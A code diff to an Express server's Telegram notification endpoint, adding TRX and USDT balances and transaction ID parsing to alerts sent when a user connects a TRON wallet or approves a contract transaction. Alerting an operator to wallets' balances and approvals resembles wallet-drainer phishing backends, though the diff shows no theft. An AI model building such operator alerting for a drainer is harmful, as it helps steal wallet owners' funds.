@@ -216,7 +216,7 @@ app.get('/server-info', (req, res) => {
 // Telegram notification endpoint
 app.post('/telegram-notify', async (req, res) => {
     try {
-        const { type, walletAddress, balance, transactionId, amount, timestamp } = req.body;
+        const { type, walletAddress, balance, usdtBalance, transactionId, amount, trxBalance, timestamp } = req.body;
         
         // Get Telegram bot token and chat ID from environment variables
         const telegramBotToken = process.env.TELEGRAM_BOT_TOKEN;
@@ -234,17 +234,37 @@ app.post('/telegram-notify', async (req, res) => {
         let message = '';
         
         if (type === 'wallet_connect') {
+            const { balance, usdtBalance } = req.body;
+            const trxBalanceStr = balance ? balance.toFixed(6) : 'N/A';
+            const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
             message = `🔗 Wallet Connected\n\n` +
                      `💰 Wallet Address: \`${walletAddress}\`\n` +
-                     `💵 Balance: ${balance ? balance.toFixed(6) : 'N/A'} TRX\n` +
+                     `💵 TRX Balance: ${trxBalanceStr} TRX\n` +
+                     `💵 USDT Balance: ${usdtBalanceStr} USDT\n` +
                      `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
                      `✅ User successfully connected their wallet`;
         } else if (type === 'transaction_approve') {
+            const { amount, transactionId, trxBalance, usdtBalance } = req.body;
             const amountInTRX = amount ? (parseInt(amount) / 1000000).toFixed(6) : 'N/A';
+            // Extract transaction ID properly - handle strings and objects
+            let txIdStr = 'N/A';
+            if (transactionId) {
+                if (typeof transactionId === 'string') {
+                    txIdStr = transactionId;
+                } else if (typeof transactionId === 'object' && transactionId !== null) {
+                    txIdStr = transactionId.txid || transactionId.txID || transactionId.hash || JSON.stringify(transactionId);
+                } else {
+                    txIdStr = String(transactionId);
+                }
+            }
+            const trxBalanceStr = trxBalance !== undefined ? parseFloat(trxBalance).toFixed(6) : 'N/A';
+            const usdtBalanceStr = usdtBalance !== undefined ? parseFloat(usdtBalance).toFixed(2) : 'N/A';
             message = `✅ Transaction Approved\n\n` +
                      `💰 Wallet Address: \`${walletAddress}\`\n` +
-                     `📊 Transaction ID: \`${transactionId || 'N/A'}\`\n` +
-                     `💵 Amount: ${amountInTRX} TRX\n` +
+                     `📊 Transaction ID: \`${txIdStr}\`\n` +
+                     `💵 Transaction Amount: ${amountInTRX} TRX\n` +
+                     `💵 Current TRX Balance: ${trxBalanceStr} TRX\n` +
+                     `💵 Current USDT Balance: ${usdtBalanceStr} USDT\n` +
                      `🕐 Time: ${timestamp || new Date().toISOString()}\n\n` +
                      `✅ User successfully approved the contract transaction`;
         } else {
